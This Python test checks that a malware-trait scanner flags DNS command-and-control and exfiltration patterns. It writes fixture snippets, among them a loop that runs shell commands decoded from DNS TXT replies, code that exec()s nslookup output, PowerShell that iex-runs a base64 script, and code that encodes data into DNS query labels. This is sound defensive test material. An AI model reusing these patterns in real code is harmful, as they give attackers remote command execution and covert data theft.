#!/usr/bin/env python3
"""Keep generic domain-generation clues separate from DNS tasking."""
import argparse
import json
from pathlib import Path
import subprocess
import tempfile

repo = Path(__file__).resolve().parents[2]
assert not (repo / 'objectives/command-and-control/dns').exists(), 'legacy DNS branch returned'
parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--cleave', default='../cleave/target/release/cleave')
args = parser.parse_args()
with tempfile.TemporaryDirectory(prefix='dns-domain-evidence-') as tmp:
    root = Path(tmp)
    tasking = '''
$day = (Get-Date).DayOfYear
$year = (Get-Date).Year
$rng = [System.Random]::new()
$alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
$i = $rng.Next(0, 10)
$a = $name + '.com'; $b = $name + '.net'; $c = $name + '.org'
Resolve-DnsName $a
[System.Net.Security.SslStream] $stream
$stream.BeginRead(); $stream.EndRead()
switch ($packet.Packet) {}
[Convert]::FromBase64String($packet.'script')
@{ 'Packet' = 'iex'; 'result' = $output }
iex $script
'''
    dns_loop = """import subprocess, re, base64

def fetch_fields():
    output = subprocess.run(["nslookup", "-type=TXT"]).stdout
    fields = re.findall("token", output)
    return fields

def run_fields():
    for field in fetch_fields():
        try:
            command = base64.b32decode(field + "====")
            subprocess.run(["/bin/sh", "-c", command.decode()])
        except Exception:
            pass
"""
    cases = {
        'dns_exfil.php': '<?php dns_get_record($dns_query, DNS_A); str_split($encoded, 58); ?>\n',
        'dns_lookup.php': '<?php dns_get_record($dns_query, DNS_A); ?>\n',
        'go_dns.go': 'package main\nfunc main() { base64.RawURLEncoding.EncodeToString(data); chunkString(data); net.LookupTXT(host); net.LookupMX(host) }\n',
        'go_no_dns.go': 'package main\nfunc main() { base64.RawURLEncoding.EncodeToString(data); chunkString(data) }\n',
        'label_exfil.ps1': '''$queryDomain = "exfil.$chunk.$SessionId"
$encoded = [Convert]::ToBase64String($bytes) -replace '[+/=]'
$pattern = '.{1,63}'
Resolve-DnsName -Type TXT $queryDomain
''',
        'label_no_query.ps1': '''$queryDomain = "exfil.$chunk.$SessionId"
$encoded = [Convert]::ToBase64String($bytes) -replace '[+/=]'
$pattern = '.{1,63}'
''',
        'formats.js': '''const p = "{a}.{b}.{c}.p."; const q = "{a}.{b}.{c}.{d}.q.";
const tenantId="x", clientId="x", clientSecret="x", mailbox="x";
''',
        'format_only.js': 'const p = "{a}.{b}.{c}.p.";\n',
        'dns_tasking.java': 'class X { void f() { String b="beacon"; String c="cmd"; String d="data"; InetAddress.getByName(host); } }\n',
        'dns_no_task.java': 'class X { void f() { String b="beacon"; InetAddress.getByName(host); } }\n',
        'packet_only.py': 'print("MSG packet")\n',
        'dnscat_secret.py': 'name = "DNSCAT_SECRET"\n',
        'tasking.kt': 'fun main() { dnsBuildTxtQuery(); dnsExecute(cmd); println("/etc/resolv.conf") }\n',
        'query_only.kt': 'fun main() { dnsBuildTxtQuery(); println("/etc/resolv.conf") }\n',
        'dns_control.m': '#import <Foundation/Foundation.h>\nvoid f() { res_query(host, 1, ns_t_txt, out, size); printf("cmd-%ld beacon-%s", x, y); }\n',
        'dns_lookup.m': '#import <Foundation/Foundation.h>\nvoid f() { res_query(host, 1, ns_t_txt, out, size); }\n',
        'chunk.go': 'package main\nfunc main() { chunks(data, 63) }\n',
        'other_chunk.go': 'package main\nfunc main() { chunks(data, 64) }\n',
        'wrapper.js': "const label = 'p.' + value + '.p';\nconst parts = input.split('.');\nconst encoded = value.toString('hex');\nconst dotted = hex(value) + '.';\n",
        'no_wrapper.js': "const parts = input.split('.');\nconst encoded = value.toString('hex');\n",
        'dns_eval.py': 'import subprocess\ncommand = subprocess.check_output(["nslookup", "example.com"]).decode().strip()\nexec(command)\n',
        'dns_process.py': 'import subprocess\ncommand = subprocess.check_output(["nslookup", "example.com"]).decode().strip()\nsubprocess.run(command)\n',
        'dns_loop.py': dns_loop,
        'dns_unrelated.py': dns_loop.replace('for field in fetch_fields():', 'for field in other_fields():'),
        'dns_shell_clues.py': 'import subprocess\n# nslookup -q=TXT\nsubprocess.check_output(["date"])\n',
        'tasking.ps1': tasking,
        'lookup.ps1': tasking.split('[System.Net.Security.SslStream]')[0],
        'clues.py': 'value = digest()[:8] + suffix\nfor tld in [".com", ".net"]: pass\ndef send_heartbeat(): pass\n',
        'no_heartbeat.py': 'value = digest()[:8] + suffix\nfor tld in [".com", ".net"]: pass\n',
        'no_candidates.py': 'value = digest()[:8] + suffix\ndef send_heartbeat(): pass\n',
    }
    for name, source in cases.items():
        (root / name).write_text(source)
    result = subprocess.run(
        [str((repo / args.cleave).resolve()), '--traits-dir', str(repo), '--min-crit', 'component',
         '--format=json', *(str(root / name) for name in cases)],
        check=True, capture_output=True, text=True,
    )
    reports = [json.loads(line)['files'][0] for line in result.stdout.splitlines() if line]
    traits = {Path(r['path']).name: {t['id']: t for t in r.get('traits', [])} for r in reports}
    java_channel = 'objectives/command-and-control/channel/dns::java-dns-c2-subdomain-beacon'
    assert java_channel in traits['dns_tasking.java'], traits['dns_tasking.java'].keys()
    assert java_channel not in traits['dns_no_task.java']
    secret = 'well-known/dual-use/tunnel/dnscat2::dnscat-secret-reference'
    assert secret in traits['dnscat_secret.py'], traits['dnscat_secret.py'].keys()
    assert not any(t.startswith('well-known/dual-use/tunnel/dnscat2::') for t in traits['packet_only.py'])
    label_exfil = 'objectives/exfiltration/dns/tunnel::ps-routeros-dns-c2-exfil'
    assert label_exfil in traits['label_exfil.ps1'], traits['label_exfil.ps1'].keys()
    assert label_exfil not in traits['label_no_query.ps1']
    formats = 'metadata/lang/source/literal/string/shape::dns-length-data-label-pair'
    fields = 'metadata/file/profile/credential-terms::entra-credential-field-set'
    assert {formats, fields} <= traits['formats.js'].keys(), traits['formats.js'].keys()
    assert formats not in traits['format_only.js'] and fields not in traits['format_only.js']
    php_exfil = 'objectives/exfiltration/dns/tunnel::php-dns-label-exfil'
    assert php_exfil in traits['dns_exfil.php'], traits['dns_exfil.php'].keys()
    assert php_exfil not in traits['dns_lookup.php']
    go_clues = 'objectives/command-and-control/channel/tunnel/dns::go-dns-c2-label-tunnel'
    assert go_clues in traits['go_dns.go'], traits['go_dns.go'].keys()
    assert go_clues not in traits['go_no_dns.go']
    kotlin = 'objectives/command-and-control/channel/dns::kotlin-dns-txt-command-channel'
    objc = 'objectives/command-and-control/channel/dns::objc-resolver-dns-c2'
    assert kotlin in traits['tasking.kt'], traits['tasking.kt'].keys()
    assert kotlin not in traits['query_only.kt']
    assert objc in traits['dns_control.m'], traits['dns_control.m'].keys()
    assert objc not in traits['dns_lookup.m']
    dns_eval = 'micro-behaviors/process/deploy/script-eval/input::python-dns-cli-response-eval'
    dns_process = 'micro-behaviors/process/deploy/file-exec/command::python-dns-cli-response-process'
    assert dns_eval in traits['dns_eval.py'], traits['dns_eval.py'].keys()
    assert dns_process in traits['dns_process.py'], traits['dns_process.py'].keys()
    assert dns_eval not in traits['dns_process.py'] and dns_process not in traits['dns_eval.py']
    dns_shell = 'objectives/command-and-control/remote-command/shell::python-dns-txt-returned-fields-shell-exec'
    assert dns_shell in traits['dns_loop.py'], traits['dns_loop.py'].keys()
    assert dns_shell not in traits['dns_unrelated.py']
    dns_clues = 'objectives/command-and-control/backdoor/tasking/dns::dns-txt-tool-and-shell-clues'
    assert dns_clues in traits['dns_shell_clues.py'], traits['dns_shell_clues.py'].keys()
    assert not any(t.startswith('objectives/command-and-control/channel/dns::') for t in traits['dns_shell_clues.py'])
    chunk = 'micro-behaviors/data/collection/group::go-chunks-63-call'
    assert chunk in traits['chunk.go'], traits['chunk.go'].keys()
    assert chunk not in traits['other_chunk.go']
    wrapper = 'micro-behaviors/data/string/concat/expression::p-dot-wrapper-expression'
    hex_call = 'micro-behaviors/data/string/concat/expression::hex-named-call-dot-concat'
    combined = 'micro-behaviors/data/encode/hex::split-hex-p-wrapper-clues'
    assert {wrapper, hex_call, combined} <= traits['wrapper.js'].keys(), traits['wrapper.js'].keys()
    assert wrapper not in traits['no_wrapper.js'] and combined not in traits['no_wrapper.js']
    channel = 'objectives/command-and-control/channel/dns::powershell-dga-script-command-channel'
    assert channel in traits['tasking.ps1'], traits['tasking.ps1'].keys()
    assert channel not in traits['lookup.ps1']
    profile = 'micro-behaviors/communications/dns/domain::python-domain-candidates-heartbeat-clues'
    assert profile in traits['clues.py'], traits['clues.py'].keys()
    assert profile not in traits['no_heartbeat.py']
    assert profile not in traits['no_candidates.py']
    assert not any(t.startswith('objectives/command-and-control/channel/dns::') for t in traits['clues.py'])
    print('Domain and heartbeat clues do not independently establish DNS tasking.')
